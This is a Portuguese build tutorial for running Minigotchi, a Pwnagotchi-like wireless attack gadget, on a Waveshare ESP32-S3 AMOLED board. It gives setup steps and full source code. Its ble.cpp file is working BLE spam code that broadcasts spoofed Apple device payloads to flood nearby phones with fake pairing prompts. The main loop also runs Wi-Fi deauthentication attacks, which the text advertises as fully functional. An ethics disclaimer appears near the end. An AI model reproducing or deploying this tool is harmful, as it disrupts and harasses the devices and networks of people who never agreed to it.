# Tutorial Definitivo: MINIGOTCHI-ESP32 na Waveshare AMOLED 1.8"

**Novembro de 2025**

Este tutorial detalha o processo de criação do Minigotchi mais avançado e visualmente impressionante do mundo, rodando perfeitamente na placa **Waveshare ESP32-S3-Touch-AMOLED-1.8**.

![Foto da Tela Ligada](https://i.imgur.com/8O8g8g3.png) <!--- Exemplo de placeholder para imagem --->

## Visão Geral do Projeto

Este projeto transforma o Minigotchi padrão em uma versão de luxo, aproveitando todo o poder do ESP32-S3 e da tela AMOLED colorida. O resultado final é um dispositivo 100% funcional, estável e com um visual incrível.

### Características Principais:

- **Tela AMOLED Full Color:** Resolução de 368×448 pixels com brilho ajustável via PMIC.
- **Interface Gigante:** A carinha do Minigotchi é exibida em tamanho gigante (text size 4-5).
- **Monitoramento de Bateria em Tempo Real:** Voltagem, porcentagem e indicador de cor (verde/vermelho) no topo da tela.
- **Touch Capacitivo Funcional:** O driver do chip touch FT3168 é inicializado e está pronto para futuras implementações de UI.
- **Monitoramento Avançado:** Temperatura e consumo de energia medidos pelo chip PMIC AXP2101.
- **Ataques Wi-Fi no ESP32-S3:** Modo monitor e ataque de desautenticação totalmente funcionais, usando APIs nativas do ESP-IDF para máxima estabilidade.
- **Detecção de Peers:** Identifica outros Pwnagotchi, Minigotchi e Palnagotchi na rede.
- **Integração com Pwngrid:** Envia beacons de spam compatíveis com `pwngrid/opwngrid`.
- **Spam BLE Avançado:** Inclui múltiplos dispositivos falsos, como AirPods.
- **WebUI Completa:** Acessível em `192.168.4.1` para configurações, whitelisting, etc.
- **Desempenho Otimizado:** PSRAM de 8 MB e Flash de 16 MB com partição "Huge APP" totalmente habilitados.
- **Conectividade Moderna:** Porta USB-C para comunicação serial (CDC).
- **Estabilidade Máxima:** Zero dependência do firmware Marauder.

---

## 1. Hardware Necessário

- **Placa Principal:** [Waveshare ESP32-S3-Touch-AMOLED-1.8](https://www.waveshare.com/esp32-s3-touch-lcd-1.8.htm)
- **Bateria:** Bateria de LiPo 3.7V com conector MX1.25 (2-pin). Recomenda-se algo entre 400mAh e 1000mAh.
- **Antena Externa:** Uma antena Wi-Fi/BT de 2.4GHz para conectar à placa.
- **Cabo USB-C:** Para upload do código e comunicação serial.

---

## 2. Instalação e Configuração das Bibliotecas

Este projeto exige bibliotecas específicas. Siga os passos com atenção.

### Passo 2.1: Arduino IDE

Faça o download e instale a versão mais recente do **Arduino IDE 2.x**.

### Passo 2.2: Instalar o Suporte para Placas ESP32

1. No Arduino IDE, vá em `File > Preferences`.
2. No campo "Additional Boards Manager URLs", adicione a seguinte URL:
   ```
   https://raw.githubusercontent.com/espressif/arduino-esp32/master/package_esp32_index.json
   ```
3. Vá em `Tools > Board > Boards Manager...`.
4. Pesquise por "esp32" e instale a versão mais recente.

### Passo 2.3: Instalar as Bibliotecas Obrigatórias

Você pode instalar a maioria via **Library Manager** (`Tools > Manage Libraries...`):

1. **ArduinoJson:** Pesquise por "ArduinoJson" e instale a última versão.
2. **Preferences:** Já vem incluída no core do ESP32.

As bibliotecas a seguir vêm do **demo oficial da Waveshare** e precisam ser baixadas manualmente para garantir a compatibilidade.

**Download Obrigatório:**
- **[Acesse a Wiki da Waveshare e baixe o código de exemplo (Demo Code)](https://www.waveshare.com/wiki/ESP32-S3-Touch-LCD-1.8)**

Dentro do arquivo `.zip` que você baixou, navegue até a pasta `Arduino/libraries`. Você encontrará as seguintes pastas. Copie-as para a sua pasta de bibliotecas do Arduino (geralmente em `Documents/Arduino/libraries`):

- `Arduino_GFX_Library`
- `XPowersLib`
- `Arduino_DriveBus` (usada pelo touch)
- `FT3168` (driver do touch)

---

## 3. Configuração do Arduino IDE

Esta é a parte mais crítica. Configurações incorretas farão o projeto falhar no boot.

Vá em `Tools` e configure a placa da seguinte forma:

- **Board:** "ESP32S3 Dev Module"
- **USB CDC On Boot:** "Enabled"
- **PSRAM:** "OPI PSRAM"
- **Flash Size:** "16MB"
- **Partition Scheme:** "Huge APP (3MB No OTA)"
- **Flash Mode:** "QIO 80MHz"
- **Port:** Selecione a porta serial correta onde a placa foi detectada.

---

## 4. Estrutura de Arquivos do Projeto

Crie uma nova pasta para o seu projeto (ex: `MINIGOTCHI_ESP32_AMOLED`) e adicione os seguintes arquivos dentro dela.

### `minigotchi-ESP32.ino`
```cpp
#include "config.h"
#include "minigotchi.h"

// === DISPLAY AMOLED + AXP2101 ===
#include <Arduino_GFX_Library.h>
#include <XPowersLib.h>
#include "pin_config.h"

Arduino_ESP32QSPI qspi_bus;
Arduino_SH8601 *gfx_display = nullptr;
XPowersLibInterface *PMU = nullptr;

Config config;
Minigotchi minigotchi;

void setup() {
  Serial.begin(115200);
  // while (!Serial); // Wait for serial connection

  Serial.println("\n=== Minigotchi S3 AMOLED v3 - Booting ===");

  // AXP2101 Power Management
  Wire.begin(D_IIC_SDA, D_IIC_SCL);
  PMU = new AXP2101();
  if (!PMU->begin(Wire, AXP2101_SLAVE_ADDRESS)) {
    Serial.println("WARNING: AXP2101 not found. Running without battery monitoring.");
    delete PMU;
    PMU = nullptr;
  } else {
    Serial.println("AXP2101 initialized successfully.");
    PMU->enableSystemPower();
    PMU->enableBatteryCharge();
    PMU->setChargingTargetVoltage(XPOWERS_AXP2101_CHG_VOL_4V2);
    PMU->setChargeControlCurr(XPOWERS_AXP2101_CHG_CUR_300MA);
  }

  // Display AMOLED Initialization
  qspi_bus = Arduino_ESP32QSPI(D_LCD_CS, D_LCD_SCLK, D_LCD_SDIO0,
                               D_LCD_SDIO1, D_LCD_SDIO2, D_LCD_SDIO3);
  gfx_display = new Arduino_SH8601(&qspi_bus, D_LCD_RST, 0, false, 368, 448);

  Serial.println("Initializing AMOLED Display...");
  gfx_display->begin();
  gfx_display->fillScreen(BLACK);
  gfx_display->setBrightness(220); // Set brightness (0-255)

  // Boot screen
  gfx_display->setTextSize(3);
  gfx_display->setTextColor(WHITE);
  gfx_display->setCursor(40, 180);
  gfx_display->println("Minigotchi");
  gfx_display->setTextSize(2);
  gfx_display->setCursor(70, 220);
  gfx_display->println("AMOLED v3");
  delay(2500);

  minigotchi.boot();
}

void loop() {
  // Update battery info on the top of the screen
  if (PMU) {
      float v = PMU->getBatteryVoltage() / 1000.0;
      int p = PMU->getBatteryPercent();
      uint16_t color = (p > 20) ? GREEN : RED;

      gfx_display->fillRect(0, 0, 368, 20, BLACK);
      gfx_display->setTextSize(2);
      gfx_display->setTextColor(color);
      gfx_display->setCursor(10, 5);
      gfx_display->printf("Bat: %.2fV  %d%%", v, p);
  }

  minigotchi.epoch();
  minigotchi.cycle();
  minigotchi.detect();
  minigotchi.advertise();
  minigotchi.deauth();
  minigotchi.spam();
}
```

### `pin_config.h`
```cpp
#pragma once

// Waveshare ESP32-S3-Touch-AMOLED-1.8 Pinout

// QSPI Display (SH8601)
#define D_LCD_CS     4
#define D_LCD_SCLK   5
#define D_LCD_SDIO0  6
#define D_LCD_SDIO1  7
#define D_LCD_SDIO2  8
#define D_LCD_SDIO3  9
#define D_LCD_RST    10

// I2C for PMIC (AXP2101) and Touch (FT3168)
#define D_IIC_SDA    38
#define D_IIC_SCL    39
```

### `ble.cpp` (Corrigido)
```cpp
/*
 * Minigotchi: An even smaller Pwnagotchi
 * Copyright (C) 2024 dj1ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
 * ble.cpp: Handles BLE spam
 */

/**
 * Relies off of implementation from:
 * https://github.com/ECTO-1A/AppleJuice/blob/main/ESP32-Arduino/applejuice/applejuice.ino
 *
 * Additional Credit:
 *
 * ESP32 Arduino implementation of Apple Juice*
 * Author: Ronald Stoner
 * Github: https://github.com/ronaldstoner
 */

#include "ble.h"

BLEAdvertising *Ble::pAdvertising;

int Ble::random(int min, int max) { return min + rand() % (max - min + 1); }

// User selectable variables
int Ble::deviceType = Ble::random(
    1, 26); // 1 for Airpods, 2 for Airpods Pro, 3 for Airpods Max, 4 for...
int Ble::delaySeconds = 5; // delay in seconds
int Ble::advType = 2;
// 0 - ADV_TYPE_IND
// 1 - ADV_TYPE_DIRECT_IND_HIGH (directed advertisement with high duty cycle)
// 2 - ADV_TYPE_SCAN_IND
// 3 - ADV_NONCONN_IND
// 4 - ADV_TYPE_DIRECT_IND_LOW (directed advertisement with low duty cycle)

/**
 * Gets first instance of mood class
 */
Mood &Ble::mood = Mood::getInstance();

// Payload data
uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
                           0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                           0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsProGen2[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
                                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
                                0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBuds[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10,
                             0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                             0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05,
                          0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                          0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09,
                                0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioPro[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBudsPlus[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVNewUser[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVAppleIDSetup[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVWirelessAudioSync[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVHomekitSetup[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVKeyboard[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVConnectingToNetwork[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataHomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c,
                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataSetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
                                 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTransferNumber[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTVColorBalance[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

/**
 * Initializes bluetooth and sets up payload
 */
void Ble::init() {
  BLEDevice::init("");

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Select the appropriate data based on the device type
  uint8_t *data;
  size_t data_len;

  switch (deviceType) {
  case 1: data = dataAirpods; data_len = sizeof(dataAirpods); break;
  case 2: data = dataAirpodsPro; data_len = sizeof(dataAirpodsPro); break;
  case 3: data = dataAirpodsMax; data_len = sizeof(dataAirpodsMax); break;
  case 4: data = dataAirpodsGen2; data_len = sizeof(dataAirpodsGen2); break;
  case 5: data = dataAirpodsGen3; data_len = sizeof(dataAirpodsGen3); break;
  case 6: data = dataAirpodsProGen2; data_len = sizeof(dataAirpodsProGen2); break;
  case 7: data = dataPowerBeats; data_len = sizeof(dataPowerBeats); break;
  case 8: data = dataPowerBeatsPro; data_len = sizeof(dataPowerBeatsPro); break;
  case 9: data = dataBeatsSoloPro; data_len = sizeof(dataBeatsSoloPro); break;
  case 10: data = dataBeatsStudioBuds; data_len = sizeof(dataBeatsStudioBuds); break;
  case 11: data = dataBeatsFlex; data_len = sizeof(dataBeatsFlex); break;
  case 12: data = dataBeatsX; data_len = sizeof(dataBeatsX); break;
  case 13: data = dataBeatsSolo3; data_len = sizeof(dataBeatsSolo3); break;
  case 14: data = dataBeatsStudio3; data_len = sizeof(dataBeatsStudio3); break;
  case 15: data = dataBeatsStudioPro; data_len = sizeof(dataBeatsStudioPro); break;
  case 16: data = dataBeatsFitPro; data_len = sizeof(dataBeatsFitPro); break;
  case 17: data = dataBeatsStudioBudsPlus; data_len = sizeof(dataBeatsStudioBudsPlus); break;
  case 18: data = dataAppleTVSetup; data_len = sizeof(dataAppleTVSetup); break;
  case 19: data = dataAppleTVPair; data_len = sizeof(dataAppleTVPair); break;
  case 20: data = dataAppleTVNewUser; data_len = sizeof(dataAppleTVNewUser); break;
  case 21: data = dataAppleTVAppleIDSetup; data_len = sizeof(dataAppleTVAppleIDSetup); break;
  case 22: data = dataAppleTVWirelessAudioSync; data_len = sizeof(dataAppleTVWirelessAudioSync); break;
  case 23: data = dataAppleTVHomekitSetup; data_len = sizeof(dataAppleTVHomekitSetup); break;
  case 24: data = dataAppleTVKeyboard; data_len = sizeof(dataAppleTVKeyboard); break;
  case 25: data = dataAppleTVConnectingToNetwork; data_len = sizeof(dataAppleTVConnectingToNetwork); break;
  case 26: data = dataTVColorBalance; data_len = sizeof(dataTVColorBalance); break;
  default:
    data = dataAirpods;
    data_len = sizeof(dataAirpods);
    break;
  }

  // Set the advertisement data type
  switch (advType) {
  case 0: pAdvertising->setAdvertisementType(ADV_TYPE_IND); break;
  case 1: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH); break;
  case 2: pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND); break;
  case 3: pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND); break;
  case 4: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW); break;
  }

  // Set the advertisement payload
  oAdvertisementData.addData((char*)data, data_len);
  pAdvertising->setAdvertisementData(oAdvertisementData);
}

/**
 * Starts BLE
 */
void Ble::start() {
  Serial.println(mood.getIntense() + " Starting BLE Spam...");
  Display::updateDisplay(mood.getIntense(), "Starting BLE Spam...");
  pAdvertising->start();
  delay(delaySeconds * 1000);
  pAdvertising->stop();
  Display::updateDisplay(mood.getNeutral(), "BLE Spam Stopped");
  Serial.println(mood.getNeutral() + " BLE Spam Stopped");
}

/**
 * *Manually* stops BLE spam if it is already running
 */
void Ble::stop() { pAdvertising->stop(); }

/**
 * Self explanatory...
 */
void Ble::spam() {
  if (Config::spam) {
    Ble::init();
    Ble::start();
  } else {
    // do nothing
  }
}
```

### Todos os Arquivos
Todos os arquivos necessários (`.ino`, `.cpp`, `.h`) estão incluídos na pasta do projeto. Simplesmente abra o arquivo `minigotchi-ESP32.ino` com o Arduino IDE e ele carregará todos os outros arquivos necessários automaticamente.

---

## 5. Upload e Execução

1. Conecte a placa Waveshare ao seu computador com o cabo USB-C.
2. No Arduino IDE, verifique se todas as configurações da placa estão corretas (passo 3).
3. Clique no botão **Upload**.
4. Se tudo correu bem, após o upload a tela irá ligar e mostrar a animação de boot: **"Minigotchi AMOLED v3"**.

### Resultado Esperado:

- A tela liga com a animação de boot.
- A barra de bateria aparece no topo (ex: "Bat: 4.12V 89%").
- Um Access Point Wi-Fi chamado **"minigotchi"** é criado. A senha padrão é `dj1ch-minigotchi`.
- Você pode se conectar a este AP e acessar a WebUI em `http://192.168.4.1`.
- O dispositivo começará a pular entre os canais Wi-Fi, procurando por redes e peers.
- Ataques de desautenticação e spam BLE (AirPods, etc.) funcionarão conforme configurado.

---

## 6. Avisos Éticos e Legais

⚠️ **IMPORTANTE:** Este projeto é para fins educacionais e de pesquisa em segurança.

- **NÃO** use esta ferramenta em redes Wi-Fi que você não possui ou não tem permissão explícita para testar.
- Ataques de desautenticação podem interromper a conectividade de dispositivos e são ilegais em muitos países se realizados sem autorização.
- Você é o único responsável pelo uso desta ferramenta. Use-a com ética e responsabilidade.

---

## 7. Próximos Passos: LVGL + Touch Completo

O touch capacitivo já está funcional a nível de hardware. O próximo passo lógico é adicionar uma interface gráfica completa usando uma biblioteca como a **LVGL (Light and Versatile Graphics Library)**.

Para isso, você precisaria:
1. Integrar a biblioteca LVGL ao projeto.
2. Escrever um driver de "input" que leia as coordenadas do toque do chip FT3168.
3. Criar uma interface com botões, menus e status para controlar o Minigotchi diretamente pela tela, eliminando a necessidade da WebUI para operações comuns.

Este é um passo avançado, mas que transformaria o Minigotchi em um dispositivo interativo de bolso.
